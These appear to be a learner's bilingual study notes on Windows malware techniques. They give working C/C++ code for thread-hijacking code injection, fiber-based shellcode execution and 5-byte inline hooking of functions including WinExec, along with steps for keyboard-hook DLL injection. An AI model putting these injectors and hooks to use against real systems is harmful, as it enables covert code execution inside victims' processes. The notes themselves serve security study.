> [!check] P165/932

[toc]

### 0x16 code injection via thread hijacking
ref: 
conti for the  0x04 Code Injection
1. find pid (via `finMyProc`)
2. open proc with `PROCESS_ALL_ACCESS`
3. allocate space & write mem buf (`VirtualAllocEx`, `WriteProcessMemory`)
4. Snapshot and enum all process to get process id (`CreateToolhelp32Snapshot`, `Thread32First`, `Thread32Next`)
5. suspend thread(`SuspendThread`)
6. update RIP to mem buf we got from 3 (`GetThreadContext`, `ct.RIP=rb`)
7. set context to our payload (`SetThreadContext`)
8. resume `ResumeThread`
9. colse thread handle (`CloaseHandle`)

> [!warning] SetThreadContext anomaly
> 在某些thread（例如 Explorer、Edge），**SetThreadContext 對 volatile registers (RAX, RCX, RDX, R8–R11) 的修改會被忽略**。  
> - 這些暫存器屬於 caller-saved，Windows 可能在執行緒恢復時覆蓋它們。  
> - 最穩定的用法是只依賴 **RIP**（指令指標）與 **RSP**（堆疊指標），其他暫存器在 shellcode 中自行設置。  
> - 不要依賴 SetThreadContext 來傳遞參數或修改 volatile registers，否則在不同進程可能失效。  

```cpp
int main(int argc, char* argv[]) {
  DWORD pid = 0; // process ID
  HANDLE ph; // process handle
  HANDLE ht; // thread handle
  LPVOID rb; // remote buffer

  HANDLE hSnapshot;
  THREADENTRY32 te;
  CONTEXT ct;

  pid = findMyProc(argv[1]);
  if (pid == 0) {
    printf("PID not found :( exiting...\n");
    return -1;
  } else {
    printf("PID = %d\n", pid);

    ct.ContextFlags = CONTEXT_FULL;
    te.dwSize = sizeof(THREADENTRY32);

    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);

    if (ph == NULL) {
      printf("OpenProcess failed! exiting...\n");
      return -2;
    }

    // allocate memory buffer for remote process
    rb = VirtualAllocEx(ph, NULL, my_payload_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // write payload to memory buffer
    WriteProcessMemory(ph, rb, my_payload, my_payload_len, NULL);

    // find thread ID for hijacking
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
    if (Thread32First(hSnapshot, &te)) {
      do {
        if (pid == te.th32OwnerProcessID) {
		  	  ht = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
          break;
  	}
      } while (Thread32Next(hSnapshot, &te));
    }

    // suspend target thread
    SuspendThread(ht);
    // now the rip is copied to ct(CONTEXT)
    GetThreadContext(ht, &ct);
    // use ct to update register (RIP)
    ct.Rip = (DWORD_PTR)rb;
    SetThreadContext(ht, &ct);
    ResumeThread(ht);

    CloseHandle(ph);
  }
  return 0;
}

```

### 0x17 DLL injection via SetWindowsHookEx
1. load malicious dll (`LoadLibrary)
2. get address of the export func in dll (`GetProcAddress)
3. hook with keyboiard minitor (`SetWindowsHookEx)
	1. `wh_keyboard` is for monitor keystroke messages
	2. 無論按什麼都會被trigger
	3. 0 for hookng all proc
4. sleep and unhook
![](https://cocomelonc.github.io/assets/images/25/2021-11-25_15-35.png)

> [!example]+ SetWIndowsHookEx and UnhookWindowsHookEx
> >🧩 SetWondowsHookEx
> 
>  ```
>  HHOOK SetWindowsHookExA(
>     [in] int       idHook, //The type of hook to be installed
>     [in] HOOKPROC  lpfn,
>     [in] HINSTANCE hmod,
>     [in] DWORD     dwThreadId
>   );
>  ```
> 
>
> - behavier: installs a hook routine into the hook chain
> - **id hook**: 有很多種不同的hook類型，監控滑鼠/鍵盤輸入
>>🧩UnHookWindowsEx
>- alwasy remember to unhook

> [!bug] CIG in win10 
> - CFG (Control Flow Guard)
> 	- prevent indirect calls to non-approved addresses
> - CIG (Code Integrity Guard)
> 	- only allow modules signed by Microsoft/Microsoft Store/WHQL to be loaded into the process memory.
> ---
> related talk: https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All.pdf

### 0x18 code injection via windows Fibers

**Fiber**:
- 一個thread可以有多個fiber，依次執行一個
- 只能manual call
- 比thread輕
- Useful for coroutines(協程?), custom schedulers, game engines, scripting runtimes, and async frameworks

>tldr: 把目前thread轉成fiber之後建立一個新的fiber然後跳過去，繼續用原本 thread 的 stack, reg, ptr

1. 讓目前 thread 變成可以使用 SwitchToFiber() 的主 fiber (`ConvertThreadToFiber`)
	1. 建立 fiber execution context
	2. 綁定目前 thread
	3. 保存 registers / stack pointer / instruction pointer
2. 分配一塊可讀+寫記憶體放payload (`VirtualAlloc`, `memcpy`)
3. 建立fiber (`CreateFiber`)
4. schedule fiber(`SwitchToFiber`)
```
Thread(main)
 ├── Fiber(mainFiber)
 └── Fiber(payloadFiber)
```

```c
int main() {
	PVOID f; // converted
	PVOID payload_mem; // memory buffer for payload
	PVOID payloadF; // fiber
	
	// convert main thread to fiber
	// f= addr of the fiber
	f = ConvertThreadToFiber(NULL);
	
	// allocate memory buffer
	payload_mem = VirtualAlloc(0, my_payload_len,	MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(payload_mem, my_payload, my_payload_len);
	
	// create a fiber that will execute payload
	payloadF = CreateFiber(NULL,	(LPFIBER_START_ROUTINE)payload_mem, NULL);
	SwitchToFiber(payloadF);
	
	return 0;
}
```


### 0x19 windows API hooking.
#### 19.1 5-bytes-hook / inline hook

```c fold
#include <windows.h>
#pragma comment (lib, "user32.lib")
BOOL APIENTRY DllMain(HMODULE hModule,

DWORD ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
		case DLL_PROCESS_ATTACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
	}
	return TRUE;
}
	
extern "C" {
	__declspec(dllexport) int _cdecl Cat(LPCTSTR say) {
		MessageBox(NULL, say, "=^..^=", MB_OK);
		return 1;
	}
}
extern "C" {
	__declspec(dllexport) int _cdecl Mouse(LPCTSTR say) {
		MessageBox(NULL, say, "<:3()~~", MB_OK);
		return 1;
}
}
extern "C" {
	__declspec(dllexport) int _cdecl Frog(LPCTSTR say) {
		MessageBox(NULL, say, "8)~", MB_OK);
		return 1;
	}
}
extern "C" {
	__declspec(dllexport) int _cdecl Bird(LPCTSTR say) {
		MessageBox(NULL, say, "<(-)", MB_OK);
		return 1;
	}
}
```

```c fold
#include <windows.h>

typedef int (__cdecl *CatProc)(LPCTSTR say);

// buffer for saving original bytes
char originalBytes[5];

FARPROC hookedAddress;

// we will jump to after the hook has been installed
int __stdcall myFunc(LPCTSTR say) {
  HINSTANCE petDll;
  CatProc catFunc;

  // unhook the function: rewrite original bytes
  WriteProcessMemory(GetCurrentProcess(), (LPVOID)hookedAddress, originalBytes, 5, NULL);

  // return to the original function and modify the text
  petDll = LoadLibrary("pet.dll");
  catFunc = (CatProc) GetProcAddress(petDll, "Cat");

  return (catFunc) ("meow-squeak-tweet!!!");
}

// hooking logic
void setMySuperHook() {
  HINSTANCE hLib;
  VOID *myFuncAddress;
  DWORD *rOffset;
  DWORD src;
  DWORD dst;
  CHAR patch[5]= {0};

  // get memory address of function Cat
  hLib = LoadLibraryA("pet.dll");
  hookedAddress = GetProcAddress(hLib, "Cat");

  // save the first 5 bytes into originalBytes (buffer)
  ReadProcessMemory(GetCurrentProcess(), (LPCVOID) hookedAddress, originalBytes, 5, NULL);

  // overwrite the first 5 bytes with a jump to myFunc
  myFuncAddress = &myFunc;

  // will jump from the next instruction (after our 5 byte jmp instruction)
  src = (DWORD)hookedAddress + 5; // addr of target addr+5
  dst = (DWORD)myFuncAddress;     // addr of myfunc
  rOffset = (DWORD *)(dst-src);   // offset = 

  // \xE9 - jump instruction
  memcpy(patch, "\xE9", 1);   // patch=[0xE9, , , , ]
  memcpy(patch + 1, &rOffset, 4);

  WriteProcessMemory(GetCurrentProcess(), (LPVOID)hookedAddress, patch, 5, NULL);

}

int main() {
  HINSTANCE petDll;
  CatProc catFunc;

  petDll = LoadLibrary("pet.dll");
  catFunc = (CatProc) GetProcAddress(petDll, "Cat");

  // call original Cat function
  (catFunc)("meow-meow");

  // install hook
  setMySuperHook();

  // call Cat function after install hook
  (catFunc)("meow-meow");

}
```

1. get target func's addr (`LoadLibrary`, `GetProcAddress`)
2. get first 5 bytes of the func (`ReadProcessMemory`, `GetCurrentProcess`)
	1. 5 是因為 jmp (`0xE9`)+ 4位的Addr
3. offset = 目標地址 - (目前指令地址 + 5)
	1. 目標地址=我們另外load進來的dll func addr
4. 把offset寫回目前process


> [!example]+ ReadProcessMemory & WriteProcessMemory
>> 🧩 ReadProcessMemory
> 
> ```
> BOOL ReadProcessMemory(
>   [in]  HANDLE  hProcess, // GetCurrentProcess()
>   [in]  LPCVOID lpBaseAddress, // hookedAddr
>   [out] LPVOID  lpBuffer,
>   [in]  SIZE_T  nSize,
>   [out] SIZE_T  *lpNumberOfBytesRead
> );
> ```
> 
> - 用途: 讀mem放到buf
> - 特色: 跨Process讀取記憶體
> - 注意: handle 要有 PROCESS_VM_READ auth
>
>
> > 🧩 WriteProcessMemory
> ```
> BOOL WriteProcessMemory(
>   [in]  HANDLE  hProcess,
>   [in]  LPVOID  lpBaseAddress,
>   [in]  LPCVOID lpBuffer,
>   [in]  SIZE_T  nSize,
>   [out] SIZE_T  *lpNumberOfBytesWritten
> );
> 
> // 成功會傳回非零的值
> ```
> - 用途: 寫入mem from buf
> - 特色: 沒有特色 就是寫入
> - 注意:handle要有`PROCESS_VM_WRITE`和`PROCESS_VM_OPERATION`

#### 19.2 hooking WinExec

same but differ at func calling
```c
// ----SNIP----

// get memory address of function MessageBoxA
hLib = LoadLibraryA("kernel32.dll");
hookedAddress = GetProcAddress(hLib, "WinExec");

// we will jump to after the hook has been installed
int __stdcall myFunc(LPCSTR lpCmdLine, UINT uCmdShow) {

	// unhook the function: rewrite original bytes
	WriteProcessMemory(GetCurrentProcess(), (LPVOID)hookedAddress, originalBytes, 5, NULL);
	
	// return to the original function and modify the text
	return WinExec("calc", uCmdShow);
}



// ----SNIP----
int main() {
	// call original
	WinExec("notepad", SW_SHOWDEFAULT);
	// install hook
	setMySuperHook();
	// call after install hook
	WinExec("notepad", SW_SHOWDEFAULT);
}

```

### 0x20 run shellcode via inline ASM
ref: https://cocomelonc.github.io/tutorial/2021/12/03/inline-asm-1.html

```c
#include <windows.h>
#include <stdio.h>
int main() {
	printf("=^..^= meow-meow. You are hacked =^..^=\n");
	asm(".byte 0x90,0x90,0x90,0x90\n\t"
	     "ret \n\t");
	return 0;
}
```

直接插入4個NOP強制ret, 不需要allocmem